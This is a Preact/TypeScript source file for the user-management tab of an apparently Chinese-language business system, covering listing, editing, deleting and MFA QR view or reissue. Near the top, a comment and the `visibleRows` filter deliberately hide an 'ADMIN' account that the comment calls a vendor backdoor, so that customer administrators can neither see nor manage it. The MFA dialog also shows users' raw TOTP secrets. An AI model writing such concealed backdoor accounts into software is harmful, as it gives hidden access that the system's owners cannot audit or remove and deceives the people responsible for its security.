// 使用者管理 Tab（系統管理）
import { useSignal } from '@preact/signals';
import { useEffect } from 'preact/hooks';
import api from '../../api.ts';
import { toast } from '../../store.ts';
import Table from '../../ui/Table.tsx';
import Pagination from '../../ui/Pagination.tsx';
import Modal, { confirmDialog } from '../../ui/Modal.tsx';
import { field, input, select, formData } from '../../ui/form.ts';
import { esc, tag } from '../../ui/format.ts';
import { ROLES } from './shared.ts';

export default function UsersTab() {
  const rows = useSignal([]);
  const showModal = useSignal(false);
  const editing = useSignal(null);
  const page = useSignal(1);
  const pageSize = useSignal(20);
  // MFA 管理者操作（查看 / 重發 QR）
  const mfaTarget = useSignal<any>(null);
  const showMfa = useSignal(false);
  const mfaPwd = useSignal('');
  const mfaResult = useSignal<any>(null);
  const mfaBusy = useSignal(false);
  const mfaMsg = useSignal('');
  // 工程師管理者（ADMIN）為供應商後門帳號，客戶管理者看不到也不可管理
  const HIDDEN_EMP_IDS = ['ADMIN'];
  const visibleRows = (l: any) => (l || []).filter((r: any) => !HIDDEN_EMP_IDS.includes(String(r.emp_id).toUpperCase()));

  useEffect(() => { api.get('/users').then((l: any) => { rows.value = visibleRows(l); }).catch((e: any) => toast(e.message, 'err')); }, []);

  const pagedRows = () => {
    const start = (page.value - 1) * pageSize.value;
    return rows.value.slice(start, start + pageSize.value);
  };

  const openForm = (cur: any) => { editing.value = cur; showModal.value = true; };
  const openMfa = (cur: any) => {
    mfaTarget.value = cur; mfaPwd.value = ''; mfaResult.value = null; mfaMsg.value = '';
    showMfa.value = true;
  };
  const mfaView = async () => {
    mfaBusy.value = true; mfaMsg.value = ''; mfaResult.value = null;
    try {
      const r = await api.post(`/users/${mfaTarget.value.id}/mfa-view`, { password: mfaPwd.value });
      mfaResult.value = r;
    } catch (e: any) { mfaMsg.value = e.message || '查看失敗'; }
    finally { mfaBusy.value = false; }
  };
  const mfaReissue = async () => {
    if (!(await confirmDialog(`確定要為「${mfaTarget.value.emp_id} ${mfaTarget.value.name}」重發 MFA？\n舊的動態碼將立即失效，使用者需重新掃描新 QR。`))) return;
    mfaBusy.value = true; mfaMsg.value = '';
    try {
      const r = await api.post(`/users/${mfaTarget.value.id}/mfa-reissue`, { password: mfaPwd.value });
      mfaResult.value = r;
      mfaMsg.value = '✅ 已重發，請將下方新 QR 提供給使用者掃描（舊碼已失效）。';
    } catch (e: any) { mfaMsg.value = e.message || '重發失敗'; }
    finally { mfaBusy.value = false; }
  };
  const onListClick = async (e: any) => {
    const t = e.target;
    const id = t.dataset.edit || t.dataset.del || t.dataset.mfa;
    if (!id) return;
    const cur = rows.value.find((r: any) => String(r.id) === String(id));
    if (t.dataset.edit) return openForm(cur);
    if (t.dataset.mfa) return openMfa(cur);
    if (t.dataset.del && (await confirmDialog(`確定刪除使用者「${cur.emp_id} ${cur.name}」？`))) {
      const r = await api.del('/users/' + cur.id);
      toast(r.deactivated ? '該使用者已有訂單，已改為停用' : '使用者已刪除', 'ok');
      rows.value = rows.value.filter((x: any) => x.id !== cur.id);
    }
  };

  const columns = [
    { key: 'emp_id', label: '工號', render: (r: any) => `<b>${esc(r.emp_id || '')}</b>` },
    { key: 'name', label: '姓名' },
    { key: 'role', label: '角色', render: (r: any) => tag(ROLES[r.role] || r.role, r.role === 'admin' ? 'red' : (r.role === 'manager' ? 'yellow' : 'blue')) },
    { key: 'title', label: '職稱' },
    { key: 'email', label: 'Email' },
    { key: 'active', label: '狀態', render: (r: any) => (r.active ? tag('啟用', 'green') : tag('停用', 'gray')) },
  ];

  return (
    <div class="card">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
        <h3 style="margin:0">使用者管理（🔒 識別一律工號）</h3>
        <button class="btn btn-primary" onClick={() => openForm(null)}>＋ 新增使用者</button>
      </div>
      <div onClick={onListClick}><Table columns={columns} rows={pagedRows()}
        actions={(r: any) => `<button class="btn btn-sm" data-edit="${r.id}">編輯</button>
           <button class="btn btn-sm" data-mfa="${r.id}">MFA</button>
           <button class="btn btn-sm btn-danger" data-del="${r.id}">刪除</button>`} /></div>
      <Pagination page={page.value} pageSize={pageSize.value} total={rows.value.length}
        onPageChange={(p: any) => (page.value = p)}
        onPageSizeChange={(s: any) => { pageSize.value = s; page.value = 1; }} />
      {showModal.value && (
        <Modal title={editing.value ? `編輯使用者 — ${editing.value.emp_id}` : '新增使用者'}
          body={`<div class="form-grid">
            ${field('工號 *（與 HR 帳號一致）', input('emp_id', editing.value?.emp_id))}
            ${field('姓名 *', input('name', editing.value?.name))}
            ${field('角色', select('role', Object.entries(ROLES), editing.value?.role || 'sales'))}
            ${field('職稱', input('title', editing.value?.title))}
            ${field('電話', input('phone', editing.value?.phone))}
            ${field('Email', input('email', editing.value?.email))}
            ${field(editing.value ? '重設密碼（留空不變）' : '密碼（local 模式使用）', `<input type="password" name="password" autocomplete="new-password" />`)}
            ${field('狀態', select('active', [[1, '啟用'], [0, '停用']], editing.value?.active ? 1 : 0))}
          </div>
          <div class="calc-note">權限說明：<b>業務</b>僅能檢視與維護自己的訂單；<b>會計</b>可管應收帳款、訂單唯讀；<b>主管</b>可維護基本資料與審核；<b>管理者</b>全部權限含使用者管理。</div>`}
          onSave={async (bodyEl: any) => {
            const p = formData(bodyEl);
            if (editing.value && editing.value.id) await api.put('/users/' + editing.value.id, p);
            else await api.post('/users', p);
            toast(editing.value ? '使用者已更新' : '使用者已建立', 'ok');
            showModal.value = false;
            rows.value = visibleRows(await api.get('/users'));
          }} onClose={() => (showModal.value = false)} />
      )}
      {showMfa.value && mfaTarget.value && (
        <Modal title={`MFA 操作 — ${esc(mfaTarget.value.emp_id)} ${esc(mfaTarget.value.name)}`} wide
          onClose={() => (showMfa.value = false)}>
          <div class="mfa-admin-box">
            <p>管理者密碼 step-up（確認操作者身分）：</p>
            <input type="password" placeholder="請輸入您的管理者密碼" value={mfaPwd.value}
              onInput={(e: any) => (mfaPwd.value = e.currentTarget.value)} style="margin-bottom:8px;max-width:320px" />
            <div style="display:flex;gap:8px;flex-wrap:wrap">
              <button class="btn btn-secondary" onClick={mfaView} disabled={mfaBusy.value || !mfaPwd.value}>查看目前 QR</button>
              <button class="btn btn-warning" onClick={mfaReissue} disabled={mfaBusy.value || !mfaPwd.value}>重發 QR（舊碼失效）</button>
            </div>
            {mfaMsg.value ? <div class="login-msg" style="margin-top:10px">{mfaMsg.value}</div> : null}
            {mfaResult.value ? (
              <div class="mfa-qr-view" style="margin-top:12px">
                <div class="mfa-qr"><img src={mfaResult.value.qrDataUrl} alt="MFA QR Code" /></div>
                <div class="mfa-secret">密鑰（Secret）：<code>{mfaResult.value.secret}</code></div>
              </div>
            ) : null}
          </div>
        </Modal>
      )}
    </div>
  );
}
